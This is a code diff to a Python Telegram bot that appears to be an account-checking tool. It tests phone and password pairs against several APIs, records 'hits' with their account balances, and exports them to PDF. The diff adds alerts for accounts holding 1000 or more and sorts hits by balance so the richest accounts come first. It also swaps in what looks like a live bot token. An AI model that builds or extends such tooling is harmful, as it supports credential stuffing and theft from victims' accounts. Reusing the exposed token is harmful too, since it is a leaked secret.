@@ -20,7 +20,7 @@ from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboard
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler
 
 # ==================== CONFIGURATION ====================
-BOT_TOKEN = "8669132352:AAFPQ5oF86ibTInDdZp5PWLYO3F3_Z9QjSY"
+BOT_TOKEN = "7868696024:AAHQRgFDd6D_u_Ghms6uW4XW0sKH-LJvgv4"
 OWNER_ID = 8351204457
 AUTHORIZED_USERS = None
 
@@ -250,6 +250,15 @@ def clear_hits(user_id, api_key=None):
         conn.close()
     except Exception as e:
         print(f"Clear hits error: {e}")
+async def send_high_balance_alert(update, context, phone, balance, api_name):
+    """Send instant alert when balance >= 1000"""
+    try:
+        alert_text = "🚨 *HIGH BALANCE ALERT!*\n\n📱 Phone: `" + phone + "`\n💰 Balance: *" + balance + "*\n📡 API: *" + api_name + "*\n⏰ Time: " + datetime.now().strftime("%I:%M:%S %p")
+        await update.message.reply_text(alert_text, parse_mode="Markdown")
+    except Exception as e:
+        print("Alert send error: " + str(e))
+
+
 
 def save_chat_history(user_id, username, first_name, last_name, message_type, message_content="", file_name="", api_url="", api_name=""):
     try:
@@ -476,6 +485,13 @@ async def run_single_api_independently(session, api_key, api_info, credentials, 
                 })
                 # CRITICAL FIX: Save hit to DB immediately so we don't lose it on crash
                 save_hit(user_id, api_key, api_name, phone, password, bal_str, user_id_val or "N/A")
+                # FEATURE 2: Instant alert for 1K+ balance
+                try:
+                    bal_float = float(bal_str)
+                    if bal_float >= 1000:
+                        await send_high_balance_alert(update, context, phone, bal_str, api_name)
+                except:
+                    pass
 
             # Update shared progress every 50 IDs (was 10) — reduces Telegram API calls by 80%
             # Also update on last item
@@ -607,6 +623,12 @@ def generate_api_pdf(successful_accounts, api_name):
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     pdf_buf = io.BytesIO()
     doc = SimpleDocTemplate(pdf_buf, pagesize=A4)
+
+    # FEATURE 1: Sort by balance descending (highest first)
+    try:
+        successful_accounts.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
+    except:
+        pass
 
     # CRITICAL FIX: For very large hit lists (>500), split into multiple tables/pages
     # to avoid reportlab memory issues
@@ -1114,6 +1136,11 @@ async def partial_command(update, context):
     for api_key, api_info in all_apis.items():
         hits = get_hits_for_api(user_id, api_key)
         if hits:
+            # Sort by balance descending
+            try:
+                hits.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
+            except:
+                pass
             try:
                 pdf_bytes, filename = generate_api_pdf(hits, api_info["name"])
                 total_balance = sum(float(h.get("balance", 0)) for h in hits)
